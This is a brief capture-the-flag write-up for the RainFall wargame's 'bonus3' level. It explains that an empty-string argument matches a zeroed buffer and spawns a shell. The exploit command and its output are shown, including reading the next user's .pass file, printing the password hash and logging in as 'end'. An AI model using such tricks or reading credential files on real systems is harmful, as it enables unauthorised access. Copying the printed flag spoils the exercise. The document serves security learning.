# Bonus 3

We have a main where the next password is opened and read into ptr.
We also see that when ptr (which is bzero'ed on line 11) and argv[1] compare equal (line 19), we get a shell. So sending an empty string gives us a shell.

The fopen and fread are red herrings here.

```shell
bonus3@RainFall:~$ ./bonus3 ""
$ cat /home/user/end/.pass
3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
```

```shell
$ su - end  
Password: 
end@RainFall:~$ ls
end
end@RainFall:~$ cat end 
Congratulations graduate!
```
